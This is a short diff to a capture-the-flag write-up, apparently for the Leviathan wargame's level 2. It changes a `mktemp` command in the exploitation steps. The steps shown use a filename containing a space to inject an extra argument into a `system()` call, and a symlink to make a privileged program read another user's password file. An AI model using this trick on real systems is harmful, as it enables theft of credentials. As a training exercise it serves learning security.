@@ -47,7 +47,7 @@ As like Linux, `system()` invokes a shell that interpret space as argument separ
 ### Exploitation
 Now, Create a temp directory in /tmp.
 ```bash
-leviathan2@leviathan:~$ mktemp
+leviathan2@leviathan:~$ mktemp -d
 /tmp/tmp.mIqrtdmv4s
 leviathan2@leviathan:~$ echo 'Hello' > /tmp/tmp.mIqrtdmv4s/"test file.txt"
 leviathan2@leviathan:~$ ln -sf /etc/leviathan_pass/leviathan3 /tmp/tmp.mIqrtdmv4s/test
